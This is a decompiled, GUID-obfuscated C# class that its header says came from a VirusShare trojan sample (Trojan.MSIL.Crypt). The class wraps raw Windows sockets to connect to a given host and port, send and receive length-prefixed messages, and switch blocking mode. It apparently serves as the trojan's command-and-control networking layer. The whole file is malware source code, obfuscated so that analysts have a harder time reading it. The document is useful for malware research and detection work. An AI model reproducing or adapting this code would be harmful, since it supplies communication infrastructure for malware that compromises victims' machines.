// Decompiled with JetBrains decompiler
// Type: {f1321fd2-b94a-452e-96a3-15c5b0a6bab7}.{b97c8be0-7c39-4cd7-8fa9-c049345e8eff}
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BD05E0A-35FE-496C-B5CD-CE720A39B54F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pfl-5d072f5224e528472e5a50d1ebed572aa86c2691d7aedaced148054ce65a49be.exe

using \u007B05f1caea\u002D76e9\u002D4664\u002Daaa3\u002Dc3a65e3228d2\u007D;
using \u007Bf1321fd2\u002Db94a\u002D452e\u002D96a3\u002D15c5b0a6bab7\u007D;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace \u007Bf1321fd2\u002Db94a\u002D452e\u002D96a3\u002D15c5b0a6bab7\u007D
{
  public class \u007Bb97c8be0\u002D7c39\u002D4cd7\u002D8fa9\u002Dc049345e8eff\u007D
  {
    public const int \u007Ba466bcad\u002D403b\u002D42c4\u002D8da7\u002De8b282696595\u007D = 8192;
    private IntPtr \u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D;
    private \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bc5a5e017\u002D56d1\u002D45a6\u002Dbd75\u002D82ce81a39358\u007D \u007B5492802e\u002Ddbb5\u002D444a\u002Da55f\u002Deb7b5cd84ace\u007D;
    private \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B8f4a1e34\u002Dc472\u002D424c\u002D9eb9\u002D196e0e45f8be\u007D \u007Bf95cdc8f\u002D000c\u002D4e07\u002D81a1\u002D4d61601bb576\u007D;
    private \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bcd95845a\u002D0cfa\u002D4b31\u002D9550\u002D2f4cc8e149ff\u007D \u007B22b4a3b2\u002D8234\u002D4ba5\u002D93d6\u002Dd58230b1a541\u007D;
    private bool \u007B1ddc6188\u002D5eb5\u002D4a89\u002D9097\u002D155389e5e241\u007D;
    private bool \u007Bb9707386\u002Dc269\u002D42a6\u002Dbadb\u002D05c55ef971b5\u007D;
    private \u007B5b59f6f1\u002D8764\u002D4e9a\u002Da1af\u002Dd564c8abae35\u007D \u007Baf4fb696\u002Dc3c9\u002D4336\u002D83da\u002De74f43efcd4d\u007D;
    private int \u007Bac7e6a06\u002Da2db\u002D4d9b\u002D808d\u002D73f0145c288b\u007D;
    private bool \u007B1b1544e5\u002Da31b\u002D4dc4\u002Dac15\u002Dae6f9ec8464c\u007D;

    public static string \u007B64abf51a\u002D19b2\u002D43b6\u002D9a30\u002D4d5c41b32f20\u007D => "0.0.0.0";

    public bool \u007B8919f69b\u002D2b4d\u002D4675\u002Db9b8\u002Db073d16408fe\u007D
    {
      get => this.\u007B1ddc6188\u002D5eb5\u002D4a89\u002D9097\u002D155389e5e241\u007D;
      set => this.\u007B1ddc6188\u002D5eb5\u002D4a89\u002D9097\u002D155389e5e241\u007D = value;
    }

    public bool \u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D
    {
      get => this.\u007Bb9707386\u002Dc269\u002D42a6\u002Dbadb\u002D05c55ef971b5\u007D;
      set => this.\u007Bb9707386\u002Dc269\u002D42a6\u002Dbadb\u002D05c55ef971b5\u007D = value;
    }

    public \u007B5b59f6f1\u002D8764\u002D4e9a\u002Da1af\u002Dd564c8abae35\u007D \u007B820747f2\u002Ddbc0\u002D4a05\u002Da782\u002D018b6858bbd6\u007D
    {
      get => this.\u007Baf4fb696\u002Dc3c9\u002D4336\u002D83da\u002De74f43efcd4d\u007D;
      set => this.\u007Baf4fb696\u002Dc3c9\u002D4336\u002D83da\u002De74f43efcd4d\u007D = value;
    }

    public int \u007B755cb6c8\u002Df702\u002D4a57\u002Dae94\u002Dd7cd894754d1\u007D
    {
      get => this.\u007Bac7e6a06\u002Da2db\u002D4d9b\u002D808d\u002D73f0145c288b\u007D;
      set => this.\u007Bac7e6a06\u002Da2db\u002D4d9b\u002D808d\u002D73f0145c288b\u007D = value;
    }

    public bool \u007Bc6e24980\u002D79d5\u002D4e22\u002D894d\u002Dec81e584b599\u007D
    {
      get => this.\u007B1b1544e5\u002Da31b\u002D4dc4\u002Dac15\u002Dae6f9ec8464c\u007D;
      set
      {
        this.\u007B1b1544e5\u002Da31b\u002D4dc4\u002Dac15\u002Dae6f9ec8464c\u007D = value;
        ulong int32 = (ulong) Convert.ToInt32(!this.\u007B1b1544e5\u002Da31b\u002D4dc4\u002Dac15\u002Dae6f9ec8464c\u007D);
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B37ab57f3\u002De16b\u002D476d\u002D983d\u002D5ae46ed2dbd0\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, 2147772030L, ref int32);
      }
    }

    public \u007Bb97c8be0\u002D7c39\u002D4cd7\u002D8fa9\u002Dc049345e8eff\u007D(
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bc5a5e017\u002D56d1\u002D45a6\u002Dbd75\u002D82ce81a39358\u007D addressFamily,
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B8f4a1e34\u002Dc472\u002D424c\u002D9eb9\u002D196e0e45f8be\u007D socketType,
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bcd95845a\u002D0cfa\u002D4b31\u002D9550\u002D2f4cc8e149ff\u007D socketProtocol)
    {
      this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B9eeca9df\u002D4df9\u002D4b0f\u002D8208\u002Df5386809e89e\u007D((int) addressFamily, (int) socketType, (int) socketProtocol);
      this.\u007B5492802e\u002Ddbb5\u002D444a\u002Da55f\u002Deb7b5cd84ace\u007D = addressFamily;
      this.\u007Bf95cdc8f\u002D000c\u002D4e07\u002D81a1\u002D4d61601bb576\u007D = socketType;
      this.\u007B22b4a3b2\u002D8234\u002D4ba5\u002D93d6\u002Dd58230b1a541\u007D = socketProtocol;
      this.\u007B1b1544e5\u002Da31b\u002D4dc4\u002Dac15\u002Dae6f9ec8464c\u007D = true;
    }

    public int \u007B1bc9f16a\u002D2404\u002D4c2a\u002Dae1c\u002D222092b19407\u007D(byte[] _param1)
    {
      int num1 = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Ba19bc217\u002Df52f\u002D4b83\u002Dacda\u002D3746556078e9\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, BitConverter.GetBytes((uint) _param1.Length), 4, 0);
      if (num1 == -1)
        return -1;
      int num2 = num1 + \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Ba19bc217\u002Df52f\u002D4b83\u002Dacda\u002D3746556078e9\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, _param1, _param1.Length, 0);
      return num2 < 0 ? -1 : num2;
    }

    public byte[] \u007B6a5c6d35\u002De44c\u002D44a3\u002D9f23\u002Df2aeebc5028f\u007D()
    {
      byte[] numArray1 = new byte[4];
      MemoryStream memoryStream = new MemoryStream();
      switch (\u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B8950cf14\u002Db0ea\u002D4abb\u002D890b\u002D70fdcea0d11f\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, numArray1, numArray1.Length, 0))
      {
        case -1:
        case 0:
          return new byte[0];
        default:
          uint uint32;
          try
          {
            uint32 = BitConverter.ToUInt32(numArray1, 0);
          }
          catch (Exception ex)
          {
            return new byte[0];
          }
          while (uint32 > 0U)
          {
            byte[] numArray2 = new byte[0];
            byte[] array = uint32 >= 8192U ? new byte[8192] : new byte[(int) uint32];
            int newSize = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B8950cf14\u002Db0ea\u002D4abb\u002D890b\u002D70fdcea0d11f\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, array, array.Length, 0);
            switch (newSize)
            {
              case -1:
                return new byte[0];
              case 0:
                return new byte[0];
              default:
                if (array.Length > newSize)
                  Array.Resize<byte>(ref array, newSize);
                uint32 -= (uint) newSize;
                memoryStream.Write(array, 0, array.Length);
                numArray2 = (byte[]) null;
                continue;
            }
          }
          memoryStream.Close();
          byte[] array1 = memoryStream.ToArray();
          memoryStream.Dispose();
          return array1;
      }
    }

    public void \u007B11b2835e\u002D27ac\u002D48bf\u002Db265\u002D49da264c3312\u007D()
    {
      this.\u007B831e79d2\u002D7453\u002D4c01\u002D884d\u002Df4e58162c9fa\u007D();
      this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B9eeca9df\u002D4df9\u002D4b0f\u002D8208\u002Df5386809e89e\u007D((int) this.\u007B5492802e\u002Ddbb5\u002D444a\u002Da55f\u002Deb7b5cd84ace\u007D, (int) this.\u007Bf95cdc8f\u002D000c\u002D4e07\u002D81a1\u002D4d61601bb576\u007D, (int) this.\u007B22b4a3b2\u002D8234\u002D4ba5\u002D93d6\u002Dd58230b1a541\u007D);
    }

    public void \u007B6ccf171b\u002D9474\u002D4564\u002Da924\u002D017326078170\u007D()
    {
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D);
      this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D = IntPtr.Zero;
      this.\u007B8919f69b\u002D2b4d\u002D4675\u002Db9b8\u002Db073d16408fe\u007D = true;
      this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D = false;
    }

    private void \u007B831e79d2\u002D7453\u002D4c01\u002D884d\u002Df4e58162c9fa\u007D()
    {
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D);
      this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D = IntPtr.Zero;
      this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D = false;
    }

    public static bool \u007Bf0d50797\u002De362\u002D4c6e\u002Da417\u002Dc1b9bb880c23\u007D()
    {
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B15361d19\u002D2f2a\u002D42f2\u002D8bb7\u002D71f88260b648\u007D obj = new \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B15361d19\u002D2f2a\u002D42f2\u002D8bb7\u002D71f88260b648\u007D();
      return \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bfd0e9587\u002Dee35\u002D43b1\u002Dba58\u002D10908e498df8\u007D((ushort) 2, ref obj) == 0;
    }

    public static int \u007B6af7235d\u002D9d41\u002D40cf\u002D9a76\u002Db97ceacb78d7\u007D() => \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B225e2f1e\u002D1ccf\u002D427c\u002D82ae\u002D5918950d9a13\u007D();

    public bool \u007Be89e8ea7\u002D3d68\u002D486b\u002D9a48\u002D7d7df8e9b177\u007D(
      string _param1,
      int _param2)
    {
      if (this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D)
        return false;
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bdf428604\u002D5c22\u002D47e2\u002D89bb\u002Df3c86a0940d8\u007D structure = new \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bdf428604\u002D5c22\u002D47e2\u002D89bb\u002Df3c86a0940d8\u007D();
      if (new Regex("\\d+.\\d+.\\d+.\\d+").IsMatch(_param1))
      {
        structure.sin_addr.S_addr = (uint) \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bf0e5df07\u002D4428\u002D4310\u002D92fc\u002D609548d5994e\u007D(_param1);
      }
      else
      {
        try
        {
          structure.sin_addr.S_addr = (uint) \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bf0e5df07\u002D4428\u002D4310\u002D92fc\u002D609548d5994e\u007D(Dns.GetHostEntry(_param1).AddressList[0].ToString());
        }
        catch
        {
          return false;
        }
      }
      structure.sin_family = (short) 2;
      structure.sin_port = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B810fadbf\u002D4854\u002D4369\u002D8074\u002D1f05f91e5745\u007D((ushort) _param2);
      if (\u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B1ae20b88\u002D0244\u002D4807\u002D9dd5\u002Dd798fbff1dac\u007D(this.\u007Bf2621a96\u002D714f\u002D44d0\u002Da11c\u002Daa5fbcb5ca9b\u007D, ref structure, Marshal.SizeOf((object) structure)) == 0)
      {
        this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D = true;
        this.\u007B755cb6c8\u002Df702\u002D4a57\u002Dae94\u002Dd7cd894754d1\u007D = _param2;
      }
      else
        this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D = false;
      return this.\u007B611b4fd7\u002D1d5e\u002D4fa9\u002Daf3a\u002D6f61220ba2db\u007D;
    }
  }
}
